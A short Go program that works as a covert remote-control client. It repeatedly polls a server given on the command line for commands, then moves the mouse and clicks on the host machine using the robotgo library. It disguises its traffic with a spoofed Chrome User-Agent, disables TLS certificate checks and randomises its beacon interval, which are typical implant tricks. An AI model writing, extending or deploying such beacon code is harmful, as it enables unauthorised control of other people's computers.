package main

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/go-vgo/robotgo"
)

func main() {
	url := "https://" + os.Args[1] + "/args"

	for {
		//发送命令执行的结果，并且获取命令
		cmdline := Send(url)
		//执行命令
		if cmdline != "" {
			execute(cmdline)
		}

	}
}

func Send(addr string) string {
	var headers = http.Header{
		"User-Agent":   {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"},
		"Content-Type": {"application/x-www-form-urlencoded"},
	}

	req, err := http.NewRequest("GET", addr, nil)
	if err != nil {
		fmt.Println(err)
	}
	req.Header = headers

	//跳过证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(30))

	client := &http.Client{Timeout: time.Duration(60+n.Int64()) * time.Second, Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}

	defer resp.Body.Close()
	resp_body, _ := ioutil.ReadAll(resp.Body)
	return string(resp_body)
}

func execute(cmd0 string) {
	func0 := strings.Split(cmd0, "|")[0]
	len0, _ := strconv.Atoi(strings.Split(cmd0, "|")[1])

	switch func0 {
	case "up":
		robotgo.MoveSmoothRelative(0, -len0)
	case "down":
		robotgo.MoveSmoothRelative(0, len0)
	case "left":
		robotgo.MoveSmoothRelative(-len0, 0)
	case "right":
		robotgo.MoveSmoothRelative(len0, 0)
	case "LC":
		robotgo.Click("left")
	case "RC":
		robotgo.Click("right")
	case "DuoC":
		robotgo.Click("left", true)
	}

}
